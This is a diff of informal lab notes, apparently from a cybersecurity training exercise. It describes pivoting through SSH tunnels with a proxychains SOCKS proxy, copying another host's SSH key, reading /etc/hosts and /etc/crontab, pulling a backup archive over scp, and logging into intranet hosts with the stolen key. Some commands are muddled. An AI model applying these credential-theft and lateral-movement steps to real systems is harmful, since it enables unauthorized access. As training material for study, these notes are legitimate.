@@ -25,5 +25,14 @@ Now when you run a localhost ssh ( ssh USERNAMEOFEXTRANET@localhost -p LOCALPORT
 Things i need to make sure work is doing this with a -D 9050 to send proxychains, but i believe it works. With this you are going to then steal the ssh key OF extranet (cat ~/.ssh/id_rsa.pub)
 and save this key that you find into a file named StolenKey, from there you chmod 600 the folder, making sure to double check everything as to not overwrite your ssh key, 
 and then you masquerade sshkey to get into the intranet ip you found (cat /etc/hosts , /etc/crontab) Jane will be the device name (intranet) and the IP will be intranet IP.
+cat /etc/crontab wioll get you the cronjobs, youll see the backup.tar file in there.
  chmod 600 /home/student/stolenkey
  ssh -i /home/student/stolenkey jane@1.2.3.4
+ 
+scp -P 20010 www-data@localhost:/tmp/backup.gz /home/student/backup.tar.gz
+chmod 600 stolenkey1
+tar -xvf /home/student/stolenkey1 -C /home/student/stolenkey1_gun
+
+ssh -i /home/student/stolenkey1 Donovian-Intranet@192.168.150.253
+
+
